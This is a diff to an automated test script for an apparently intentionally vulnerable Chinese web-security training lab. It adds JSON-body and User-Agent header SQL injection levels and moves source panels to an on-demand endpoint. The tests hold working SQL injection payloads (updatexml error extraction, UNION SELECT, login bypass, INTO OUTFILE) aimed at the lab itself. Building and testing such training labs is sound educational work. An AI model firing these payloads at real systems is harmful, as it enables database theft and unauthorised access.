@@ -9,6 +9,7 @@ bafanglab - 全关卡一键自动化功能测试脚本
 依赖：requests（见 requirements.txt，run.bat 会自动安装）
 """
 import base64
+import json
 import os
 import re
 import sys
@@ -227,7 +228,7 @@ r = post('/install.php')
 check('install.php 重置环境', r.status_code == 200 and '安装完成' in r.text, 'HTTP %d' % r.status_code)
 
 # ---------- 1. 全部关卡页面可达性 + 学习辅助按钮 ----------
-section('[1] 关卡页面可达性（31页，含学习辅助按钮）')
+section('[1] 关卡页面可达性（33页，含学习辅助按钮）')
 pages = [
     '/modules/burp/index.php', '/modules/burp/response.php',
     '/modules/burp/replay.php', '/modules/burp/price.php',
@@ -236,7 +237,8 @@ pages = [
     '/modules/brute/index.php', '/modules/brute/captcha.php',
     '/modules/xss/reflect.php', '/modules/xss/stored.php', '/modules/xss/dom.php',
     '/modules/xss/upload.php', '/modules/xss/platform.php',
-    '/modules/sqli/get.php', '/modules/sqli/post.php', '/modules/sqli/error.php',
+    '/modules/sqli/get.php', '/modules/sqli/post.php', '/modules/sqli/json.php',
+    '/modules/sqli/header.php', '/modules/sqli/error.php',
     '/modules/sqli/blind.php', '/modules/sqli/time.php', '/modules/sqli/outfile.php',
     '/modules/xxe/index.php', '/modules/upload/index.php', '/modules/fileinc/index.php',
     '/modules/csrf/index.php', '/modules/ssrf/index.php', '/modules/fileread/index.php',
@@ -256,20 +258,37 @@ bad = []
 for p in src_pages:
     r = get(p)
     t = r.text
+    # 响应瘦身改造后：页面保留全部学习辅助按钮，但不再内嵌源码/修复/案例面板（点击时经 piece.php 按需加载）
     if r.status_code != 200 or 'btn-code' not in t or 'btn-fix' not in t \
-            or 'id="lvlSrc"' not in t or 'id="lvlFix"' not in t:
+            or 'id="lvlSrc"' in t or 'id="lvlFix"' in t or 'id="lvlCase"' in t:
         bad.append('%s(HTTP %d)' % (p, r.status_code))
-check('%d 个关卡页面 200 且学习辅助按钮/源码弹窗齐全' % len(src_pages), not bad,
+check('%d 个关卡页面 200 且学习辅助按钮齐全、响应无内嵌辅助面板' % len(src_pages), not bad,
       '异常: ' + ', '.join(bad) if bad else '全部正常')
 bad = []
 for p in no_src_pages:
     r = get(p)
     t = r.text
     if r.status_code != 200 or 'btn-code' in t or 'id="lvlSrc"' in t \
-            or 'btn-fix' not in t or 'id="lvlFix"' not in t:
+            or 'btn-fix' not in t or 'id="lvlFix"' in t:
         bad.append('%s(HTTP %d)' % (p, r.status_code))
 check('Burp/目录扫描/参数Fuzz 已移除漏洞源码、保留修复示例', not bad,
       '异常: ' + ', '.join(bad) if bad else '全部正常')
+# 学习辅助内容按需加载端点：piece.php 应能返回 basic/src/fix/case 片段
+bad_piece = []
+for slug, variant, pieces in (
+    ('sqli', 'get', ['basic', 'hint', 'tools', 'bypass', 'fix', 'src', 'case']),
+    ('jsleak', 'unauth', ['basic', 'fix', 'src']),
+    ('burp', 'index', ['fix']),           # 无漏洞源码关卡：piece=src 应为空
+):
+    for piece in pieces:
+        r = get('/piece.php?slug=%s&variant=%s&piece=%s' % (slug, variant, piece))
+        if r.status_code != 200 or not r.text.strip():
+            bad_piece.append('%s/%s/%s(HTTP %d)' % (slug, variant, piece, r.status_code))
+r = get('/piece.php?slug=burp&variant=index&piece=src')
+if r.status_code != 200 or r.text.strip():
+    bad_piece.append('burp/index/src 应为空(HTTP %d)' % r.status_code)
+check('piece.php 按需端点返回各关卡辅助内容片段', not bad_piece,
+      '异常: ' + ', '.join(bad_piece) if bad_piece else '全部正常')
 bad = []
 for p in intro_pages:
     r = get(p)
@@ -295,8 +314,8 @@ for p in ('/modules/burp/basic.php', '/modules/burp/intro.php'):
 # 关卡数单一数据源：首页徽标 = 各模块入口页页签数（单页模块为 1），模块页/关卡页徽标一致
 r = get('/index.php')
 counts = [int(x) for x in re.findall(r'class="lvl-badge"[^>]*>(\d+)</span>', r.text)]
-check('首页 16 个模块关卡数角标顺序正确（Burp 4 / XSS 5 / SQLi 6）',
-      counts == [4, 1, 1, 2, 2, 5, 6, 1, 1, 1, 1, 1, 1, 2, 1, 1], counts)
+check('首页 16 个模块关卡数角标顺序正确（Burp 4 / XSS 5 / SQLi 8）',
+      counts == [4, 1, 1, 2, 2, 5, 8, 1, 1, 1, 1, 1, 1, 2, 1, 1], counts)
 # 角标必须只显示数字 + 有可访问名称（不再出现 LEVELS 单位文字）
 check('首页关卡数角标仅数字且带 aria-label',
       'LEVELS' not in r.text and 'aria-label="4 个关卡"' in r.text
@@ -540,6 +559,28 @@ r = get('/modules/sqli/get.php?id=' + urllib.parse.quote('-1 UNION SELECT 1,secr
 check('GET 联合注入取通关凭证', '恭喜你完成本关挑战！' in r.text)
 r = post('/modules/sqli/post.php', {'username': "admin' or '1'='1", 'password': 'x'})
 check('POST 万能密码绕过', '当前身份：admin' in r.text)
+# JSON 注入：提交 JSON body，username 字段拼进 SQL
+r = requests.post(BASE + '/modules/sqli/json.php',
+                  data=json.dumps({'username': "admin'"}),
+                  headers={'Content-Type': 'application/json',
+                           'User-Agent': 'bafanglab-auto-test/1.0'},
+                  timeout=30, verify=False)
+check('JSON 注入单引号触发 MySQL 报错', 'SQL syntax' in r.text or 'error' in r.text.lower())
+r = requests.post(BASE + '/modules/sqli/json.php',
+                  data=json.dumps({'username': "' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}),
+                  headers={'Content-Type': 'application/json',
+                           'User-Agent': 'bafanglab-auto-test/1.0'},
+                  timeout=30, verify=False)
+check('JSON 注入 updatexml 读出通关凭证', '恭喜你完成本关挑战！' in r.text)
+# 请求头注入：User-Agent 拼进 SQL
+r = requests.get(BASE + '/modules/sqli/header.php',
+                 headers={'User-Agent': "admin'"},
+                 timeout=30, verify=False)
+check('请求头注入单引号触发 MySQL 报错', 'SQL syntax' in r.text or 'error' in r.text.lower())
+r = requests.get(BASE + '/modules/sqli/header.php',
+                 headers={'User-Agent': "' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"},
+                 timeout=30, verify=False)
+check('请求头注入 updatexml 读出通关凭证', '恭喜你完成本关挑战！' in r.text)
 r = get('/modules/sqli/error.php?id=' + urllib.parse.quote("1'"))
 check('报错注入回显 MySQL 错误', 'SQL syntax' in r.text or 'error' in r.text.lower())
 r = get('/modules/sqli/blind.php?name=' + urllib.parse.quote("admin' and 1=1-- -"))
@@ -560,7 +601,10 @@ try:
 except OSError:
     pass
 r = get('/modules/sqli/get.php')
-check('SQL 注入模块共 6 个子关选项卡', '/modules/sqli/outfile.php' in r.text and '文件读写' in r.text)
+check('SQL 注入模块共 8 个子关选项卡（含 JSON / 请求头）',
+      '/modules/sqli/json.php' in r.text and 'JSON 注入' in r.text
+      and '/modules/sqli/header.php' in r.text and '请求头注入' in r.text
+      and '/modules/sqli/outfile.php' in r.text and '文件读写' in r.text)
 payload_w = ("-1 UNION SELECT 1,(SELECT secret FROM secrets WHERE id=1),3,4 "
              "INTO OUTFILE '%s'" % sqli_flag)
 r = get('/modules/sqli/outfile.php?step=write&w=' + urllib.parse.quote(payload_w))
@@ -689,7 +733,8 @@ r = get('/about.php')
 check('about.php 三张教程表格完整', r.status_code == 200 and r.text.count('chk-table') >= 3,
       'HTTP %d' % r.status_code)
 # XXE 源码面板必须高亮第 23/26 行（开启实体加载器 + LIBXML_NOENT 外部实体替换点）
-r = get('/modules/xxe/index.php')
+# 源码面板不再内嵌页面，改从 piece.php 按需端点获取
+r = get('/piece.php?slug=xxe&variant=index&piece=src')
 check('XXE 源码高亮第 23/26 行（LIBXML_NOENT）',
       'class="src-line src-vuln"><span class="src-ln">23</span>' in r.text
       and 'class="src-line src-vuln"><span class="src-ln">26</span>' in r.text
@@ -698,7 +743,11 @@ check('XXE 源码高亮第 23/26 行（LIBXML_NOENT）',
 # 源码面板红行必须与源文件里的 @vuln 标记完全一致（防止手写行号再次漂移）
 bad_hl = []
 for p in src_pages:
-    t = get(p).text
+    m_pg = re.match(r'/modules/([^/]+)/([^/]+)\.php$', p)
+    if not m_pg:
+        bad_hl.append(p + '(路径无法解析 slug/variant)')
+        continue
+    t = get('/piece.php?slug=%s&variant=%s&piece=src' % (m_pg.group(1), m_pg.group(2))).text
     m = re.search(r'<div class="src-meta">([^（<]+)', t)
     if not m:
         bad_hl.append(p + '(无源码面板)')
@@ -730,7 +779,8 @@ ZH_PAGES = [
     '/modules/jsleak/index.php', '/modules/jsleak/unauth.php', '/modules/brute/index.php',
     '/modules/brute/captcha.php', '/modules/xss/reflect.php', '/modules/xss/stored.php',
     '/modules/xss/dom.php', '/modules/xss/upload.php', '/modules/xss/platform.php',
-    '/modules/sqli/get.php', '/modules/sqli/post.php',
+    '/modules/sqli/get.php', '/modules/sqli/post.php', '/modules/sqli/json.php',
+    '/modules/sqli/header.php',
     '/modules/sqli/error.php', '/modules/sqli/blind.php', '/modules/sqli/time.php',
     '/modules/sqli/outfile.php',
     '/modules/xxe/index.php', '/modules/upload/index.php', '/modules/fileinc/index.php',
@@ -769,7 +819,8 @@ check('简体模式无繁体字残留', not bad_tw, ', '.join(bad_tw[:3]) or 'al
 check('简体模式无 PHP 原始码泄漏', not bad_php, ', '.join(bad_php[:3]) or 'all ok')
 
 # 源码面板里的相对路径（Windows 下要显示成正斜杠，且不能为空）
-r = get('/modules/xss/dom.php')
+# 源码面板不再内嵌页面，改从 piece.php 按需端点获取
+r = get('/piece.php?slug=xss&variant=dom&piece=src')
 m = _re.search(r'<div class="src-meta">([^<]*)</div>', r.text)
 _meta = m.group(1) if m else ''
 check('源码面板显示相对路径', _meta.startswith('modules/xss/dom.php'), _meta[:40] or 'empty')
